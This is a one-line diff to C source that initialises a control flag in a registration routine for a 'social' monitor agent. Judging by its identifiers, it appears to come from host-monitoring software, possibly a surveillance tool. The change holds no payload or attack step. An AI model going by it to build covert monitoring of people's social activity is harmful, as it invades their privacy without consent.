@@ -166,5 +166,6 @@ DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
 
 void PM_SocialAgentRegister()
 {
+	social_process_control = SOCIAL_PROCESS_CONTINUE;
 	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
